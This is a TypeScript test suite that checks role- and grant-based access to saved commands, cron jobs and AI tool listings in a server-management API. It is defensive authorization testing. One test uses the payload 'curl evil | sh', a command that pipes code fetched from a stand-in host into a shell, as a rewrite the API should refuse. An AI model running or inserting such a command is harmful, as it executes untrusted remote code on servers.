import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';

// No SSH: a run that gets as far as connecting records a failure instead
vi.mock('../../ssh/credentials.js', () => ({
  resolveServerAuth: async () => {
    throw new Error('no SSH in tests');
  },
}));

import { nanoid } from 'nanoid';
import { and, eq } from 'drizzle-orm';
import { buildApp } from '../app.js';
import { runMigrations } from '../../db/migrate.js';
import { getDb } from '../../db/index.js';
import { cronJobs, memberships, resourceGrants, roleMembers, roles, savedCommands } from '../../db/schema.js';
import { ToolExecutor, buildSystemPrompt } from '../../ai/tools.js';
import { creatorRefusal } from '../../worker/processors/cron.js';
import { seedOrg, seedServer, seedUser } from './test-utils.js';

/**
 * Saved commands and cron jobs under custom roles (spec §2.7, §5): every
 * route at view / operate / manage, reached through the base role (scope
 * `all`), a role and personal grants (scope `roles`), with 404 for what is
 * out of sight and 403 for what is visible at too low a level.
 *
 *   s1 (tag web), s2 (tag web), s3 (tag web, hidden from role-scoped members)
 *   c1 unbound command, granted; c2 unbound command, never granted
 *   j1 job on s1, granted; j2 job on s1, never granted; j3 job on s3
 */

type Subject = 'admin' | 'opAll' | 'viewAll' | 'roleOp' | 'grantView' | 'grantManage' | 'nothing';
const SUBJECTS: Subject[] = ['admin', 'opAll', 'viewAll', 'roleOp', 'grantView', 'grantManage', 'nothing'];

describe('saved commands and cron jobs under custom roles', () => {
  let app: Awaited<ReturnType<typeof buildApp>>;
  let orgId: string;
  const users = {} as Record<Subject, ReturnType<typeof seedUser>>;
  let s1: string;
  let s2: string;
  let s3: string;
  let c1: string;
  let c2: string;
  let j1: string;
  let j2: string;
  let j3: string;

  function grant(
    principal: { role: string } | { user: string },
    resourceType: string,
    level: 'view' | 'operate' | 'manage',
    resourceId: string | null,
  ) {
    getDb()
      .insert(resourceGrants)
      .values({
        id: nanoid(),
        orgId,
        principalType: 'role' in principal ? 'role' : 'user',
        principalId: 'role' in principal ? principal.role : principal.user,
        resourceType,
        selector: resourceId ? 'id' : 'all',
        resourceId,
        level,
      })
      .run();
  }

  function scopeToRoles(userId: string) {
    getDb()
      .update(memberships)
      .set({ scope: 'roles' })
      .where(and(eq(memberships.userId, userId), eq(memberships.orgId, orgId)))
      .run();
  }

  function seedCommand(name: string) {
    const id = nanoid();
    getDb().insert(savedCommands).values({ id, orgId, name, command: `echo ${name}`, createdBy: users.admin.userId }).run();
    return id;
  }

  function seedJob(name: string, serverId: string, createdBy = users.admin.userId, savedCommandId?: string) {
    const id = nanoid();
    getDb()
      .insert(cronJobs)
      .values({
        id,
        orgId,
        serverId,
        name,
        schedule: '0 * * * *',
        createdBy,
        enabled: false,
        ...(savedCommandId ? { savedCommandId } : { inlineCommand: 'uptime' }),
      })
      .run();
    return id;
  }

  // A fresh address per request keeps the matrix under the per-IP rate limit
  let requests = 0;
  const ip = () => `10.9.${Math.floor(++requests / 250)}.${requests % 250}`;

  const send = (who: Subject, method: 'GET' | 'POST' | 'PATCH' | 'DELETE', url: string, payload?: object) =>
    app.inject({ remoteAddress: ip(), method, url, headers: users[who].headers, ...(method === 'GET' ? {} : { payload: payload ?? {} }) });

  beforeAll(async () => {
    await runMigrations();
    orgId = seedOrg('org-commands-cron-roles');
    users.admin = seedUser(orgId, 'admin');
    users.opAll = seedUser(orgId, 'operator');
    users.viewAll = seedUser(orgId, 'viewer');
    users.roleOp = seedUser(orgId, 'viewer');
    users.grantView = seedUser(orgId, 'viewer');
    users.grantManage = seedUser(orgId, 'viewer');
    // An operator by base role, but role-scoped with nothing granted
    users.nothing = seedUser(orgId, 'operator');
    for (const who of ['roleOp', 'grantView', 'grantManage', 'nothing'] as const) scopeToRoles(users[who].userId);

    s1 = seedServer(orgId, users.admin.userId, 'web-1', ['web']);
    s2 = seedServer(orgId, users.admin.userId, 'web-2', ['web']);
    s3 = seedServer(orgId, users.admin.userId, 'web-3', ['web']);
    c1 = seedCommand('c-one');
    c2 = seedCommand('c-two');
    j1 = seedJob('j-one', s1);
    j2 = seedJob('j-two', s1);
    j3 = seedJob('j-three', s3);

    // A viewer raised by a role: operate s1, view s2, operate c1 and j1
    const ops = nanoid();
    getDb().insert(roles).values({ id: ops, orgId, name: 'Ops', createdBy: users.admin.userId }).run();
    getDb().insert(roleMembers).values({ roleId: ops, userId: users.roleOp.userId, orgId }).run();
    grant({ role: ops }, 'server', 'operate', s1);
    grant({ role: ops }, 'server', 'view', s2);
    grant({ role: ops }, 'saved_command', 'operate', c1);
    grant({ role: ops }, 'cron_job', 'operate', j1);

    // Personal grants: view only
    const gv = { user: users.grantView.userId };
    grant(gv, 'server', 'view', s1);
    grant(gv, 'saved_command', 'view', c1);
    grant(gv, 'cron_job', 'view', j1);

    // Personal grants: manage the command and job, operate the server
    const gm = { user: users.grantManage.userId };
    grant(gm, 'server', 'operate', s1);
    grant(gm, 'saved_command', 'manage', c1);
    grant(gm, 'cron_job', 'manage', j1);

    app = await buildApp();
    await app.ready();
  });

  afterAll(async () => {
    await app.close();
  });

  describe('lists', () => {
    const visible: Record<Subject, { commands: string[]; jobs: string[] }> = {
      admin: { commands: ['c1', 'c2'], jobs: ['j1', 'j2', 'j3'] },
      opAll: { commands: ['c1', 'c2'], jobs: ['j1', 'j2', 'j3'] },
      viewAll: { commands: ['c1', 'c2'], jobs: ['j1', 'j2', 'j3'] },
      roleOp: { commands: ['c1'], jobs: ['j1'] },
      grantView: { commands: ['c1'], jobs: ['j1'] },
      grantManage: { commands: ['c1'], jobs: ['j1'] },
      nothing: { commands: [], jobs: [] },
    };

    it.each(SUBJECTS)('%s sees exactly what they reach', async (who) => {
      const names = { [c1]: 'c1', [c2]: 'c2', [j1]: 'j1', [j2]: 'j2', [j3]: 'j3' } as Record<string, string>;
      const label = (rows: { id: string }[]) => rows.map((r) => names[r.id]).filter(Boolean).sort();
      expect(label((await send(who, 'GET', '/api/commands')).json())).toEqual(visible[who].commands);
      expect(label((await send(who, 'GET', '/api/cron-jobs')).json())).toEqual(visible[who].jobs);
    });
  });

  // One row per route; each subject's expected status
  type Row = {
    name: string;
    method: 'GET' | 'POST' | 'PATCH' | 'DELETE';
    url: () => string;
    body?: () => object;
    expect: Record<Subject, number>;
  };

  const commandRows: Row[] = [
    {
      name: 'command runs (view)',
      method: 'GET',
      url: () => `/api/commands/${c1}/runs`,
      expect: { admin: 200, opAll: 200, viewAll: 200, roleOp: 200, grantView: 200, grantManage: 200, nothing: 404 },
    },
    {
      name: 'run on an operable server (operate on command and server)',
      method: 'POST',
      url: () => `/api/commands/${c1}/run`,
      body: () => ({ serverId: s1 }),
      expect: { admin: 202, opAll: 202, viewAll: 403, roleOp: 202, grantView: 403, grantManage: 202, nothing: 404 },
    },
    {
      name: 'run on a server seen but not operable',
      method: 'POST',
      url: () => `/api/commands/${c1}/run`,
      body: () => ({ serverIds: [s1, s2] }),
      expect: { admin: 202, opAll: 202, viewAll: 403, roleOp: 403, grantView: 403, grantManage: 404, nothing: 404 },
    },
    {
      name: 'tag fan-out needs operate on every tagged server it sees',
      method: 'POST',
      url: () => `/api/commands/${c1}/run`,
      body: () => ({ tag: 'web' }),
      expect: { admin: 202, opAll: 202, viewAll: 403, roleOp: 403, grantView: 403, grantManage: 202, nothing: 404 },
    },
    {
      name: 'run on a hidden server',
      method: 'POST',
      url: () => `/api/commands/${c1}/run`,
      body: () => ({ serverId: s3 }),
      expect: { admin: 202, opAll: 202, viewAll: 403, roleOp: 404, grantView: 403, grantManage: 404, nothing: 404 },
    },
    {
      name: 'edit (manage; scope-all operators as before)',
      method: 'PATCH',
      url: () => `/api/commands/${c1}`,
      body: () => ({ name: 'c-one' }),
      expect: { admin: 200, opAll: 200, viewAll: 403, roleOp: 403, grantView: 403, grantManage: 200, nothing: 404 },
    },
    {
      name: 'edit an ungranted command',
      method: 'PATCH',
      url: () => `/api/commands/${c2}`,
      body: () => ({ name: 'c-two' }),
      expect: { admin: 200, opAll: 200, viewAll: 403, roleOp: 404, grantView: 404, grantManage: 404, nothing: 404 },
    },
    {
      name: 'delete (manage; admin-only for scope-all members as before)',
      method: 'DELETE',
      url: () => `/api/commands/${c2}`,
      expect: { admin: 204, opAll: 403, viewAll: 403, roleOp: 404, grantView: 404, grantManage: 404, nothing: 404 },
    },
    {
      name: 'create (manage on every command, or a scope-all operator)',
      method: 'POST',
      url: () => '/api/commands',
      body: () => ({ name: 'new', command: 'true' }),
      expect: { admin: 201, opAll: 201, viewAll: 403, roleOp: 403, grantView: 403, grantManage: 403, nothing: 403 },
    },
  ];

  const cronRows: Row[] = [
    {
      name: 'run history (view)',
      method: 'GET',
      url: () => `/api/cron-jobs/${j1}/runs`,
      expect: { admin: 200, opAll: 200, viewAll: 200, roleOp: 200, grantView: 200, grantManage: 200, nothing: 404 },
    },
    {
      name: 'enable / disable (operate)',
      method: 'PATCH',
      url: () => `/api/cron-jobs/${j1}`,
      body: () => ({ enabled: false }),
      expect: { admin: 200, opAll: 200, viewAll: 403, roleOp: 200, grantView: 403, grantManage: 200, nothing: 404 },
    },
    {
      name: 'run now (operate on job and server)',
      method: 'POST',
      url: () => `/api/cron-jobs/${j1}/run`,
      expect: { admin: 202, opAll: 202, viewAll: 403, roleOp: 202, grantView: 403, grantManage: 202, nothing: 404 },
    },
    {
      name: 'edit (manage; scope-all operators as before)',
      method: 'PATCH',
      url: () => `/api/cron-jobs/${j1}`,
      body: () => ({ name: 'j-one' }),
      expect: { admin: 200, opAll: 200, viewAll: 403, roleOp: 403, grantView: 403, grantManage: 200, nothing: 404 },
    },
    {
      name: 'change what it runs (manage, and operate on its server)',
      method: 'PATCH',
      url: () => `/api/cron-jobs/${j1}`,
      body: () => ({ inlineCommand: 'uptime' }),
      expect: { admin: 200, opAll: 200, viewAll: 403, roleOp: 403, grantView: 403, grantManage: 200, nothing: 404 },
    },
    {
      name: 'create on an operable server',
      method: 'POST',
      url: () => '/api/cron-jobs',
      body: () => ({ serverId: s1, name: 'new', schedule: '0 * * * *', inlineCommand: 'true', enabled: false }),
      expect: { admin: 201, opAll: 201, viewAll: 403, roleOp: 403, grantView: 403, grantManage: 403, nothing: 403 },
    },
    {
      name: 'delete an ungranted job',
      method: 'DELETE',
      url: () => `/api/cron-jobs/${j2}`,
      expect: { admin: 404, opAll: 204, viewAll: 403, roleOp: 404, grantView: 404, grantManage: 404, nothing: 404 },
    },
    {
      // Last: the admin and the operator leave j1 on s2, which only roleOp also sees
      name: 'move to a server not operable',
      method: 'PATCH',
      url: () => `/api/cron-jobs/${j1}`,
      body: () => ({ serverId: s2 }),
      expect: { admin: 200, opAll: 200, viewAll: 403, roleOp: 403, grantView: 403, grantManage: 404, nothing: 404 },
    },
  ];

  // Each subject's requests run in the order above, the admin's last so the
  // admin's delete of j2 (404 then) and of c2 comes after everyone else's
  const order: Subject[] = ['nothing', 'grantView', 'roleOp', 'viewAll', 'grantManage', 'opAll', 'admin'];

  describe.each([
    ['saved commands', commandRows],
    ['cron jobs', cronRows],
  ] as const)('%s', (_label, rows) => {
    for (const row of rows) {
      it(row.name, async () => {
        const got = {} as Record<Subject, number>;
        for (const who of order) {
          got[who] = (await send(who, row.method, row.url(), row.body?.())).statusCode;
        }
        expect(got).toEqual(row.expect);
      });
    }
  });

  describe('details', () => {
    it('a role-scoped cron manager may create a job with manage on every job and operate on its server', async () => {
      const member = seedUser(orgId, 'viewer');
      scopeToRoles(member.userId);
      grant({ user: member.userId }, 'cron_job', 'manage', null);
      grant({ user: member.userId }, 'server', 'view', s1);
      const body = { serverId: s1, name: 'mine', schedule: '0 * * * *', inlineCommand: 'true', enabled: false };
      const viewOnly = await app.inject({ remoteAddress: ip(), method: 'POST', url: '/api/cron-jobs', headers: member.headers, payload: body });
      expect(viewOnly.statusCode).toBe(403);

      grant({ user: member.userId }, 'server', 'operate', s1);
      const ok = await app.inject({ remoteAddress: ip(), method: 'POST', url: '/api/cron-jobs', headers: member.headers, payload: body });
      expect(ok.statusCode).toBe(201);

      // A saved command the job would run needs operate on the command too
      const withCommand = await app.inject({
        remoteAddress: ip(),
        method: 'POST',
        url: '/api/cron-jobs',
        headers: member.headers,
        payload: { ...body, inlineCommand: undefined, savedCommandId: c1 },
      });
      expect(withCommand.statusCode).toBe(404);
      grant({ user: member.userId }, 'saved_command', 'view', c1);
      const viewCommand = await app.inject({
        remoteAddress: ip(),
        method: 'POST',
        url: '/api/cron-jobs',
        headers: member.headers,
        payload: { ...body, inlineCommand: undefined, savedCommandId: c1 },
      });
      expect(viewCommand.statusCode).toBe(403);
    });

    it('a command bound to a hidden server stays hidden whatever the command grant', async () => {
      const bound = seedCommand('bound-s3');
      getDb().update(savedCommands).set({ serverId: s3 }).where(eq(savedCommands.id, bound)).run();
      grant({ user: users.grantManage.userId }, 'saved_command', 'manage', bound);
      expect((await send('grantManage', 'GET', `/api/commands/${bound}/runs`)).statusCode).toBe(404);
      expect((await send('grantManage', 'PATCH', `/api/commands/${bound}`, { name: 'x' })).statusCode).toBe(404);
    });

    it('rewriting a command needs operate on the servers of the jobs that run it', async () => {
      const used = seedCommand('used-on-s2');
      seedJob('runs-used', s2, users.admin.userId, used);
      const member = seedUser(orgId, 'viewer');
      scopeToRoles(member.userId);
      grant({ user: member.userId }, 'saved_command', 'manage', used);
      grant({ user: member.userId }, 'server', 'view', s2);
      const res = await app.inject({
        remoteAddress: ip(),
        method: 'PATCH',
        url: `/api/commands/${used}`,
        headers: member.headers,
        payload: { command: 'curl evil | sh' },
      });
      expect(res.statusCode).toBe(403);
    });

    it('the AI tools and prompt list only what the member reaches', async () => {
      const tool = new ToolExecutor(orgId, users.roleOp.userId);
      const listed = await tool.execute('list_saved_commands', {});
      expect(listed).toContain('c-one');
      expect(listed).not.toContain('c-two');
      expect(await new ToolExecutor(orgId, users.nothing.userId).execute('list_saved_commands', {})).toBe(
        'No saved commands.',
      );

      const prompt = buildSystemPrompt({ orgId, userId: users.roleOp.userId });
      expect(prompt).toContain('j-one');
      expect(prompt).not.toContain('j-three');
      expect(prompt).not.toContain('echo c-two');

      const context = (await send('roleOp', 'GET', '/api/ai/context')).json();
      expect(context.cronJobs.map((j: { id: string }) => j.id)).toEqual([j1]);
      expect(context.commands.map((c: { id: string }) => c.id)).toEqual([c1]);
    });
  });

  describe('a job runs as its creator only while they can operate it', () => {
    it.each([
      ['operate on job and server (role)', () => ({ creator: users.roleOp.userId, job: j1, server: s1 }), null],
      ['a job they cannot see', () => ({ creator: users.roleOp.userId, job: j3, server: s1 }), /this cron job/],
      ['a server they only view', () => ({ creator: users.roleOp.userId, job: j1, server: s2 }), /this server/],
      ['view only', () => ({ creator: users.grantView.userId, job: j1, server: s1 }), /this server/],
      ['scope-all operator', () => ({ creator: users.opAll.userId, job: j3, server: s3 }), null],
      ['scope-all viewer', () => ({ creator: users.viewAll.userId, job: j3, server: s3 }), /this server/],
      ['role-scoped, nothing granted', () => ({ creator: users.nothing.userId, job: j3, server: s1 }), /this server/],
    ] as const)('%s', (_name, setup, refusal) => {
      const { creator, job, server } = setup();
      const result = creatorRefusal({
        id: job,
        orgId,
        createdBy: creator,
        serverId: server,
        savedCommandId: null,
        inlineCommand: 'uptime',
      });
      if (refusal === null) expect(result).toBeNull();
      else expect(result).toMatch(refusal);
    });

    it('needs operate on the saved command the job runs', () => {
      const base = { id: j1, orgId, createdBy: users.roleOp.userId, serverId: s1, inlineCommand: null };
      expect(creatorRefusal({ ...base, savedCommandId: c1 })).toBeNull();
      expect(creatorRefusal({ ...base, savedCommandId: c2 })).toMatch(/saved command/);
    });

    it('stops once the creator leaves the role', () => {
      const job = { id: j1, orgId, createdBy: users.roleOp.userId, serverId: s1, savedCommandId: null, inlineCommand: 'uptime' };
      expect(creatorRefusal(job)).toBeNull();
      getDb().delete(roleMembers).where(eq(roleMembers.userId, users.roleOp.userId)).run();
      expect(creatorRefusal(job)).toMatch(/no longer has access/);
    });
  });
});
